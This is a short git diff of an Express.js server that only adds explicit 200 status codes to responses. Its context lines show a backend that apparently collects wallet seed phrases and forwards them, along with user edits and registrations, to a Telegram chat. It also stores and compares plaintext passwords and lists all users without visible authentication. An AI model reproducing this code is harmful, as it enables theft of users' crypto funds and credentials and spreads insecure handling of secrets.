@@ -73,7 +73,7 @@ app.post('/register', async (req, res) => {
                         `ID: ${user.id}`;
         await sendTelegramNotification(message);
 
-        res.json({ success: true, user });
+        res.status(200).json({ success: true, user });
     } catch (error) {
         console.error('Error in /register:', error.stack);
         res.status(500).json({ error: 'Server error' });
@@ -89,7 +89,7 @@ app.post('/login', async (req, res) => {
         const userResult = await client.query("SELECT * FROM users WHERE login = $1 AND password = $2", [req.body.login, req.body.password]);
         const user = userResult.rows[0];
         if (user) {
-            res.json({ success: true, user });
+            res.status(200).json({ success: true, user });
         } else {
             res.status(401).json({ error: 'Invalid login or password' });
         }
@@ -119,7 +119,7 @@ app.post('/update-wallet', async (req, res) => {
                             `Seed-фразы: ${updatedUser.seeds.join(', ')}`;
             await sendTelegramNotification(message);
 
-            res.json({ success: true });
+            res.status(200).json({ success: true });
         } else {
             res.status(404).json({ error: 'User not found' });
         }
@@ -135,7 +135,7 @@ app.get('/users', async (req, res) => {
     const client = await pool.connect();
     try {
         const usersResult = await client.query("SELECT * FROM users");
-        res.json(usersResult.rows);
+        res.status(200).json(usersResult.rows);
     } catch (error) {
         console.error('Error in /users:', error.stack);
         res.status(500).json({ error: 'Server error' });
@@ -164,7 +164,7 @@ app.post('/update-user', async (req, res) => {
                             `Изменения: ${JSON.stringify(req.body, null, 2)}`;
             await sendTelegramNotification(message);
 
-            res.json({ success: true });
+            res.status(200).json({ success: true });
         } else {
             res.status(404).json({ error: 'User not found' });
         }
